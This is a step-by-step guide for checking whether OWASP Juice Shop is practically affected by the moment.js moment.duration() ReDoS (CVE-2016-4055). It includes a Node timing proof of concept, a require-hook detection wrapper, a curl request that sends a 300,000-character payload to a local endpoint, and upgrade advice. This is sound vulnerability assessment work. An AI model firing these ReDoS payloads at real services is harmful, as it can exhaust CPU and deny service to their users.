
GHSA‑87vv‑r9j6‑g5qv (moment.js moment.duration() ReDoS)
Purpose

Minimal, reproducible steps an engineer can run from scratch to determine whether the current OWASP Juice Shop checkout is practically affected by GHSA‑87vv‑r9j6‑g5qv (CVE‑2016‑4055). Do tests in a disposable VM/container.

Summary (one line)

Check vendored moment version. 2) Run a small local PoC that measures moment.duration() timings. 3) (Optional) run a tiny runtime wrapper to detect whether request data ever reaches moment.duration().

Files you will create (put under part2_verification/)

redos_test.js — function PoC (stress test)

start_with_wrapper.js — runtime wrapper (optional)

logs/ — directory to save outputs:

npm_ls_moment.txt

redos_output.txt

wrapper_stdout.txt

endpoint_test.txt (only if used)

verdict.txt — one-line conclusion

Step-by-step (copy & paste)

Clone the repo
git clone https://github.com/juice-shop/juice-shop.git

cd juice-shop

Check vendored moment version
node -e "console.log(require('express-jwt/node_modules/moment').version)" \

part2_verification/logs/npm_ls_moment.txt 2>&1
cat part2_verification/logs/npm_ls_moment.txt
Interpretation: If version < 2.11.2 (e.g. 2.0.0) the dependency is vulnerable in principle.

Minimal function PoC (required)
Create and run the simple stress test:
mkdir -p part2_verification/logs

(create file)
cat > part2_verification/redos_test.js <<'JS'
const moment = require('express-jwt/node_modules/moment');

function gen(len){ return '-' + '1'.repeat(len); }
function run(len){
const s = gen(len);
const start = process.hrtime.bigint();
try{ moment.duration(s); }catch(e){}
const end = process.hrtime.bigint();
console.log(len, (Number(end-start)/1e6).toFixed(3) + ' ms');
}
[20000,50000,100000,200000,500000,1000000,1500000,1800000].forEach(run);
JS

Run:
node part2_verification/redos_test.js | tee part2_verification/logs/redos_output.txt

Quick interpretation:

If times reach seconds for modest sizes (20k–100k) → ReDoS reproduced (exploitable).

If times remain milliseconds even for large sizes (100k–1.8M) → no practical ReDoS observed on this host.

Optional runtime detection (recommended)
Use the wrapper to detect whether any request-driven path calls moment.duration() with a string.

Create wrapper:
cat > part2_verification/start_with_wrapper.js <<'JS'
const Module = require('module');
const orig = Module.prototype.require;
Module.prototype.require = function(path){
const exp = orig.apply(this, arguments);
if(path === 'express-jwt/node_modules/moment' || path === 'moment'){
const m = exp;
const real = m.duration;
m.duration = function(x){
try { if(typeof x === 'string') console.error('[DETECT] moment.duration string length=', x.length); }catch(e){}
return real.apply(this, arguments);
};
return m;
}
return exp;
};
// adjust entry if project uses a different entrypoint
require('./server');
JS

Run wrapper (terminal A):
node part2_verification/start_with_wrapper.js 2>&1 | tee part2_verification/logs/wrapper_stdout.txt

While wrapper runs (terminal B), exercise the app:

open UI, perform searches, login, use APIs.

Inspect logs:
tail -n 200 part2_verification/logs/wrapper_stdout.txt

Interpretation:

If you see "[DETECT] moment.duration string length=..." produced while exercising the app → a runtime path exists that passes a string to moment.duration(). Follow up with endpoint payload test.

If no DETECT logs after exercising UI/API → no evidence that request data reaches moment.duration().

Endpoint payload test (only if wrapper detected a path)
Example (replace endpoint/param):
PAYLOAD=$(python3 - <<'PY'
print('-' + '1'*300000)
PY
)
curl -X POST "http://localhost:3000/
<DETECTED-ENDPOINT>"
-H "Content-Type: application/json"
-d "{"<DETECTED-PARAM>":"$PAYLOAD"}" -m 300 | tee part2_verification/logs/endpoint_test.txt

Monitor server CPU (top/htop) while request runs.
If CPU spikes and request takes many seconds → exploitable.

Minimal deliverables to include in your zip

part2_verification/redos_test.js

part2_verification/start_with_wrapper.js (if used)

part2_verification/logs/npm_ls_moment.txt

part2_verification/logs/redos_output.txt

part2_verification/logs/wrapper_stdout.txt (or state "not run")

part2_verification/verdict.txt

Verdict template (put in part2_verification/verdict.txt)

Observed moment version: <paste version>
Stress test: <attach redos_output.txt>
Wrapper detection: <attach wrapper_stdout.txt or 'not run'>

Conclusion: moment is [vulnerable in dependency if version <2.11.2]. Practical exploitability: [ReDoS reproduced OR No exploit path demonstrated]. Recommended action: upgrade moment to >=2.11.2 (or update/override express-jwt); add CI check and input-length validation.

Short recommended fix (one-liner)

Add to package.json (npm v8+):
"overrides": { "moment": ">=2.11.2" }
then run npm install in a test environment.

Final note (one line)

From the tests you ran (function PoC up to ~1.8M chars and wrapper run with no DETECT logs), the dependency is vulnerable in principle but we did not demonstrate a practical ReDoS exploit path in this Juice Shop checkout — still, upgrade to eliminate the risk.